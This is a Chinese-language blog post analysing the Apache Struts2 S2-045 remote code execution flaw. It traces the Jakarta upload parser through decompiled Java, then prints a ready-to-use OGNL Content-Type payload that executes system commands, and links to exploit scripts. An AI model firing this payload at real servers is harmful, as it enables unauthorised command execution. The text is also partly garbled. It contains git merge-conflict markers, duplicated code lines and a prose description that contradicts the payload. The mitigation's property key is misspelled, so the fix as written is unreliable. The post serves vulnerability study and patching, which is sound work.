---
layout:     post
title:      "Apache Struts2 Remote Code Execution (S2-045) "
subtitle:   "Analysis of the Vulnerabilities"
date:       2017-03-08
author:     "Urahara"
categories: [Struts2, Remote Code Execution, Java Security]

---

### Versions Affected

```
Struts 2.3.5 - Struts 2.3.31
Struts 2.5 - Struts 2.5.10
And you are using Jakarta based file upload Multipart parser
```

### Description

> It is possible to perform a RCE attack with a malicious Content-Type value. If the Content-Type value isn't valid an exception is thrown which is then used to display an error message to a user.

可以了解到的是该漏洞利用点为文件上传http请求头中的Content-Type，Struts2在处理错误信息时出现问题，可以在此处注入OGNL表达式造成RCE。

### Vulnerability Analysis

web应用下上传文件需要为表单设置enctype="multipart/form-data"属性，表单将以二进制编码的方式提交请求，然后由解析器进行解析，struts2不提供解析器，但可以和common-fileupload等结合。struts2默认使用Jakarta的common-fileupload文件上传框架（在struts2-core.jar中default.properties中可见struts.multipart.parser=jakarta）。

#### Code Review

> code review struts2 2.3.24

从Struts2的入口来分析，*StrutsPrepareAndExecuteFilter* 是struts2默认配置的入口过滤器，首先执行dofilter进行过滤，其中有对request的封装

```java
public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain)
    throws IOException, ServletException
  {
    HttpServletRequest request = (HttpServletRequest)req;
    HttpServletResponse response = (HttpServletResponse)res;
    try
    {
      if ((this.excludedPatterns != null) && (this.prepare.isUrlExcluded(request, this.excludedPatterns)))
      {
        chain.doFilter(request, response);
      }
      else
      {
        this.prepare.setEncodingAndLocale(request, response);
        this.prepare.createActionContext(request, response);
        this.prepare.assignDispatcherToThread();
        request = this.prepare.wrapRequest(request); 
        // Struts2对输入请求对象request的进行封装
        request = this.prepare.wrapRequest(request); 
        // Struts2对输入请求对象request的进行封装
        ActionMapping mapping = this.prepare.findActionMapping(request, response, true);
        if (mapping == null)
        {
          boolean handled = this.execute.executeStaticResourceRequest(request, response);
          if (!handled) {
            chain.doFilter(request, response);
          }
        }
        else
        {
          this.execute.executeAction(request, response, mapping);
        }
      }
    }
    finally
    {
      this.prepare.cleanupRequest(request);
    }
  }
```

跟进 *prepare.wrapRequest* 查看封装过程，可以看到当Content-Type为multipart/form-data的时候会调用MultiPartRequestWrapper，这个是一个对各种不同上传方式的封装，其中就包含Jakarta等传输方式，所以poc中必须声明multipart/form-data

```java
public HttpServletRequest wrapRequest(HttpServletRequest oldRequest)
    throws ServletException
  {
    HttpServletRequest request = oldRequest;
    try
    {
<<<<<<< HEAD
      request = this.dispatcher.wrapRequest(request); 
      // wrapRequest再次封装
=======
      request = this.dispatcher.wrapRequest(request); // wrapRequest再次封装
>>>>>>> origin/master
    }
    catch (IOException e)
    {
      throw new ServletException("Could not wrap servlet request with MultipartRequestWrapper!", e);
    }
    return request;
  }
```

```Java
public HttpServletRequest wrapRequest(HttpServletRequest request)
    throws IOException
  {
    if ((request instanceof StrutsRequestWrapper)) {
      return request;
    }
    String content_type = request.getContentType(); 
    // struts.multipart.parser：该属性指定处理multipart/form-data的MIME类型（文件上传）请求的框架，该属性支持cos、pell和jakarta等属性值，即分别对应使用cos的文件上传框架、pell上传及common-fileupload文件上传框架。该属性的默认值为jakarta。

    if ((content_type != null) && (content_type.contains("multipart/form-data")))
    // 判断是否以post方式向服务器提交二进制数据，所以poc中需声明multipart/form-data
    {
      MultiPartRequest mpr = getMultiPartRequest();
      LocaleProvider provider = (LocaleProvider)getContainer().getInstance(LocaleProvider.class);
      request = new MultiPartRequestWrapper(mpr, request, getSaveDir(), provider, this.disableRequestAttributeValueStackLookup); 
      // 调用MultiPartRequestWrapper对上传文件方式进行封装，包含默认的Jakarta等传输方式
    }
    else
    {
      request = new StrutsRequestWrapper(request, this.disableRequestAttributeValueStackLookup);
    }
    return request;
  }
```

继续跟进MultiPartRequestWrapper，MultiPartRequestWrapper.java封装了parse函数

```java
public MultiPartRequestWrapper(MultiPartRequest multiPartRequest, HttpServletRequest request, String saveDir, LocaleProvider provider)
  {
    super(request);
    this.errors = new ArrayList();
    this.multi = multiPartRequest;
    this.defaultLocale = provider.getLocale();
    setLocale(request);
    try
    {
      this.multi.parse(request, saveDir);  
      // parse函数进行解析request
      this.multi.parse(request, saveDir);  
      // parse函数进行解析request
      for (String error : this.multi.getErrors()) {
        addError(error);
      }
    }
    catch (IOException e)
    {
      if (LOG.isWarnEnabled()) {
        LOG.warn(e.getMessage(), e, new String[0]);
      }
      addError(buildErrorMessage(e, new Object[] { e.getMessage() }));
    }
  }
```

查看 ***JakartaMultiPartRequest.java*** 中对该parse函数的定义

```java
public void parse(HttpServletRequest request, String saveDir)
    throws IOException
  {
    try
    {
      setLocale(request);
      processUpload(request, saveDir); // 上传实现的调用
    }
    catch (FileUploadBase.SizeLimitExceededException e)
    {
      if (LOG.isWarnEnabled()) {
        LOG.warn("Request exceeded size limit!", e, new String[0]);
      }
      String errorMessage = buildErrorMessage(e, new Object[] { Long.valueOf(e.getPermittedSize()), Long.valueOf(e.getActualSize()) });
      if (!this.errors.contains(errorMessage)) {
        this.errors.add(errorMessage);
      }
    }
    catch (Exception e) // 捕获异常
    {
      if (LOG.isWarnEnabled()) {
        LOG.warn("Unable to parse request", e, new String[0]);
      }
      String errorMessage = buildErrorMessage(e, new Object[0]); 
      // 对捕获的异常进行处理
      String errorMessage = buildErrorMessage(e, new Object[0]); 
      // 对捕获的异常进行处理
      if (!this.errors.contains(errorMessage)) {
        this.errors.add(errorMessage);
      }
    }
  }
```

继续跟踪 ***processUpload*** 调用

```java
protected void processUpload(HttpServletRequest request, String saveDir)
    throws FileUploadException, UnsupportedEncodingException
  {
    for (FileItem item : parseRequest(request, saveDir)) // 调用
    {
      if (LOG.isDebugEnabled()) {
        LOG.debug("Found item " + item.getFieldName(), new String[0]);
      }
      if (item.isFormField()) {
        processNormalFormField(item, request.getCharacterEncoding());
      } else {
        processFileField(item);
      }
    }
  }
```

继续跟踪 ***parseRequest*** ，看到这里使用了ServletFileUpload差不多明白这里因该是调用了第三方组件 ***common upload*** 完成的上传功能

```java
  protected List<FileItem> parseRequest(HttpServletRequest servletRequest, String saveDir)
    throws FileUploadException
  {
    DiskFileItemFactory fac = createDiskFileItemFactory(saveDir);
    ServletFileUpload upload = createServletFileUpload(fac);
    return upload.parseRequest(createRequestContext(servletRequest));
  }
  //  commons-fileupload-1.3.1.jar org.apache.commons.fileupload.servlet ServletFileUpload.java
  protected ServletFileUpload createServletFileUpload(DiskFileItemFactory fac)
  {
    ServletFileUpload upload = new ServletFileUpload(fac);
    upload.setSizeMax(this.maxSize);
    return upload;
  }
```

继续跟踪 commons-fileupload-1.3.1.jar 中 *ServletFileUpload* ，查看上传功能的具体实现 

```java
public class ServletFileUpload
  extends FileUpload
{
  private static final String POST_METHOD = "POST";
  
  public static final boolean isMultipartContent(HttpServletRequest request)
  {
    if (!"POST".equalsIgnoreCase(request.getMethod())) { // POST请求方法
      return false;
    }
    return FileUploadBase.isMultipartContent(new ServletRequestContext(request));
  }
  
  public ServletFileUpload() {}
  
  public ServletFileUpload(FileItemFactory fileItemFactory)
  {
    super(fileItemFactory);
  }
  
  public List<FileItem> parseRequest(HttpServletRequest request)
    throws FileUploadException
  {
    return parseRequest(new ServletRequestContext(request)); // parseRequest
  }
  
  public Map<String, List<FileItem>> parseParameterMap(HttpServletRequest request)
    throws FileUploadException
  {
    return parseParameterMap(new ServletRequestContext(request)); 
  }
  
  public FileItemIterator getItemIterator(HttpServletRequest request)
    throws FileUploadException, IOException
  {
    return super.getItemIterator(new ServletRequestContext(request));
  }
}
```

继续跟踪 ***parseRequest*** 在org.apache.commons.fileupload FileUploadBase.java

```java
public List<FileItem> parseRequest(RequestContext ctx)
    throws FileUploadException
  {
    List<FileItem> items = new ArrayList();
    boolean successful = false;
    try
    {
      FileItemIterator iter = getItemIterator(ctx); 
      // 跟踪getItemIterator(ctx)方法
      FileItemIterator iter = getItemIterator(ctx); 
      // 跟踪getItemIterator(ctx)方法
      FileItemFactory fac = getFileItemFactory();
      if (fac == null) {
        throw new NullPointerException("No FileItemFactory has been set.");
      }
      FileItemStream item;
      while (iter.hasNext())
      {
        item = iter.next();
        
        String fileName = ((FileUploadBase.FileItemIteratorImpl.FileItemStreamImpl)item).name;
        FileItem fileItem = fac.createItem(item.getFieldName(), item.getContentType(), item.isFormField(), fileName);
        
        items.add(fileItem);
        try
        {
          Streams.copy(item.openStream(), fileItem.getOutputStream(), true);
        }
        catch (FileUploadIOException e)
        {
          throw ((FileUploadException)e.getCause());
        }
        catch (IOException e)
        {
          throw new IOFileUploadException(String.format("Processing of %s request failed. %s", new Object[] { "multipart/form-data", e.getMessage() }), e);
        }
        FileItemHeaders fih = item.getHeaders();
        fileItem.setHeaders(fih);
      }
      successful = true;
      Iterator i$;
      FileItem fileItem;
      return items;
    }
    catch (FileUploadIOException e)
    {
      throw ((FileUploadException)e.getCause());
    }
    catch (IOException e)
    {
      throw new FileUploadException(e.getMessage(), e);
    }
    finally
    {
      if (!successful) {
        for (FileItem fileItem : items) {
          try
          {
            fileItem.delete();
          }
          catch (Throwable e) {}
        }
      }
    }
  }
```

跟踪方法 ***getItemIterator(ctx)*** 

```java
public FileItemIterator getItemIterator(RequestContext ctx)
    throws FileUploadException, IOException
  {
    try
    {
      return new FileItemIteratorImpl(ctx); 
      // 继续跟踪FileItemIteratorImpl(ctx)方法
      return new FileItemIteratorImpl(ctx); 
      // 继续跟踪FileItemIteratorImpl(ctx)方法
    }
    catch (FileUploadIOException e)
    {
      throw ((FileUploadException)e.getCause());
    }
  }
```

跟踪到 ***FileItemIteratorImpl*** 后发现这里是对Content-Type及Content-length等内容的异常判断，其中对Content-Type进行异常判断抛出异常内容，要注意的是异常内容中含有原始的Content-Type内容（**重要**）

```java
private class FileItemIteratorImpl
    implements FileItemIterator
  {
    private final MultipartStream multi;
    private final MultipartStream.ProgressNotifier notifier;
    private final byte[] boundary;
    private FileItemStreamImpl currentItem;
    private String currentFieldName;
    private boolean skipPreamble;
    private boolean itemValid;
    private boolean eof;
 // ……
  FileItemIteratorImpl(RequestContext ctx)
      throws FileUploadException, IOException
    {
      if (ctx == null) {
        throw new NullPointerException("ctx parameter");
      }
      String contentType = ctx.getContentType();
      if ((null == contentType) || (!contentType.toLowerCase(Locale.ENGLISH).startsWith("multipart/"))) {
        throw new FileUploadBase.InvalidContentTypeException(String.format("the request doesn't contain a %s or %s stream, content type header is %s", new Object[] { "multipart/form-data", "multipart/mixed", contentType })); // 对Content-Type进行异常判断抛出异常内容，要注意的是异常内容中含有原始的Content-Type内容
      }
      InputStream input = ctx.getInputStream();
      // ……
    }
  }  
```

分析到这里已经对整个异常的处理有所了解，而根据官方描述Content-Type中可以注入ognl表达式，那么根据上述分析struts2在处理request时，抛出的content-type异常当中则会含有ognl表达式，那怎么才能执行呢，我们回到  ***JakartaMultiPartRequest.java*** 中对异常的处理部分跟踪 ***buildErrorMessage*** ，发现如下代码片段

```java
protected String buildErrorMessage(Throwable e, Object[] args)
  {
    String errorKey = "struts.messages.upload.error." + e.getClass().getSimpleName();
    if (LOG.isDebugEnabled()) {
      LOG.debug("Preparing error message for key: [#0]", new String[] { errorKey });
    }
    return LocalizedTextUtil.findText(getClass(), errorKey, this.defaultLocale, e.getMessage(), args);  //findText
  }
```

看一下[官方](https://struts.apache.org/maven/struts2-core/apidocs/com/opensymphony/xwork2/util/LocalizedTextUtil.html)对findtext的定义：

> If a message is found, it will also be interpolated. Anything within ${...} will be treated as an OGNL expression and evaluated as such.

所以到此为止也就明白，findtext有执行ognl的能力，Content-Type抛出的异常中${···}里的内容将以ognl被执行，如果ognl精心构造后也就能执行系统命令

### POC & EXP

**POC分析**

```
header["Content-Type"]="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
```

通过#nike='multipart/form-data'语句使得后台判断语句content_type.contains("multipart/form-data")判断结果为true，以便攻击代码得以传入。同时将攻击代码'cat /etc/passwd'赋值给#cmd参数。接下来通过(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})来判断目标主机的操作系统类型，并选择性的进行指令赋值，最终将攻击指令执行

**批量检测POC执行效果**

![s2-045-bd](http://reverse-tcp.xyz/static/img/posts/s2-045-bd.png)

**EXP执行效果**

![s2-045-exp](http://reverse-tcp.xyz/static/img/posts/s2-045-exp.png)

注： 以上脚本适用于https站点

[**Download**](https://github.com/Urahara3389/POC-EXP/tree/master/Struts2)

### Solution

- 方法一：

  修改web应用的struts.xml配置文件，在struts标签下添加以下内容

  ```
  <constant name = “struts.custom.i18n.resources” value=”global”>
  ```

  在WEB-INF/classes/目录下新建global.properties文件。写入如下文件内容：

  ```
  struts.messages.upload.error.InvalodContentTypeException=1
  ```

- 方法二：

  最保险的办法直接使用最新版struts2的jar包替换原jar文件进行升级，有三个包必须要升级（升级前备份原版本jar包）：

- Struts2-core-2.3.32.jar：struts2核心包，也是此漏洞发生的所在；

- xwork-core-2.3.32.jar：struts2依赖包，版本跟随struts2一起更新；

- ongl-3.0.19.jar：用于支持ognl表达式，为其他包提供依赖；

     建议先在测试环境进行升级测试，查看是否会影响业务正常运行。

    ​

  ​

-----

### Referer

[http://blog.nsfocus.net/apache-struts2-remote-code-execution-vulnerability-analysis-program/](http://blog.nsfocus.net/apache-struts2-remote-code-execution-vulnerability-analysis-program/)

**感谢我盟！感谢6哥！**